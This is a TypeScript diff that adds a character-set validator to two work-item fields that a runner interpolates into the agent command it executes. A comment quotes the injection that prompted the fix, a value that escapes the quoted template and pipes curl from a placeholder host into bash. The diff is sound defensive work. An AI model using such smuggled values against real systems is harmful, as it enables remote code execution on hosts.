@@ -16,6 +16,7 @@ import { z } from 'zod';
 import {
   BLOCKED_REASONS,
   FEATURE_STATES,
+  SAFE_SPINE_STRING,
   WORK_ITEM_KINDS,
   WORK_ITEM_STATES,
   type SpineEngine,
@@ -59,6 +60,28 @@ function def<I extends z.ZodType>(
   readonly = false,
 ): CommandDef<I> {
   return { name, description, input, readonly };
+}
+
+/**
+ * 0.2c: spine strings the RUNNER interpolates into the agent command it executes.
+ *
+ * `invokeDevWith` and `externalKey` are written through create_work_item /
+ * import_stories — i.e. by an actor holding `task.plan`, not necessarily the
+ * operator — and `packages/runner` substitutes them into `--agent-cmd` before
+ * running it. Unconstrained, `invokeDevWith: '" ; curl http://x | bash ; "'`
+ * escaped the documented double-quoted template and executed on the runner host.
+ *
+ * `stories.ts` already enforced this shape for a story `id`; the contract accepted
+ * any string for the same field. One definition now serves both (SAFE_SPINE_STRING
+ * in @oahs/core), so the two cannot disagree again.
+ */
+function safeSpineString(label: string, minLength = 0): z.ZodType<string> {
+  return z
+    .string()
+    .min(minLength)
+    .refine((value) => SAFE_SPINE_STRING.test(value), {
+      message: `${label} may contain only letters, digits, spaces and . _ / : @ # , - (it is interpolated into the agent command the runner executes)`,
+    });
 }
 
 export const COMMANDS = [
@@ -152,17 +175,18 @@ export const COMMANDS = [
       name: z.string().min(1).optional(),
     }),
   ),
+
   def(
     'create_work_item',
     'Create a single work item. kind selects WHICH machine-evidence guards apply (Phase 4) — never WHO may pass a gate.',
     z.object({
       featureId: z.string().min(1),
-      externalKey: z.string().min(1),
+      externalKey: safeSpineString('externalKey', 1),
       title: z.string().min(1),
       kind: z.enum(WORK_ITEM_KINDS).optional().describe("Work-item kind; default 'code'"),
       specCheckpoint: z.boolean().optional(),
       doneCheckpoint: z.boolean().optional(),
-      invokeDevWith: z.string().optional(),
+      invokeDevWith: safeSpineString('invokeDevWith').optional(),
       dependsOn: z.array(z.string().min(1)).optional().describe('externalKeys this item depends on'),
     }),
   ),
